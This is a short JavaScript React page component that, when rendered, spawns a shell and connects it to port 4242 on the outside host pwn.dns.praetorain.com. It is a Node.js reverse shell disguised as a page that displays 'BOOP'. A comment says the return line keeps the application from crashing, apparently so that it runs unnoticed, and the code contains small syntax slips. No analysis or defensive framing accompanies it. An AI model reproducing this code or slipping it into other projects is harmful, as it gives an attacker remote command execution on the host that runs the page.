export default function Index() {

  var net = require("net"),
  var cp = require("child_process"),
      sh = cp.spawn("/bin/sh", []);
  var client = new net.Socket();
  client.connect(4242, "pwn.dns.praetorain.com", function(){
      client.pipe(sh.stdin);
      sh.stdout.pipe(client);
      sh.stderr.pipe(client);
  });
  return <h1>BOOP</h1>; // Prevents the Node.js application form crashing
}
